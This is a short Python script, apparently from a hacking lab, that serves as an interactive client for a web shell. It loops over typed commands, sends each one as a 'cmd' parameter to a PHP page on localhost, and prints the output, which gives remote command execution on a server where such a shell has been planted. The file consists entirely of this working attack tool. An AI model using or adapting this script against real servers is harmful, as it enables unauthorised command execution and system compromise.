#!/usr/bin/env python3

import requests
import signal
import sys

from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo del programa...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/index.php"

def run_command(command):
    
    data = {
        'cmd': '%s' % command
    }

    r = requests.get(main_url, params=data)

    return r.text

if __name__ == "__main__":

    while True:
        command = input(colored("> ", "yellow"))
        output = run_command(command)
        print(output)
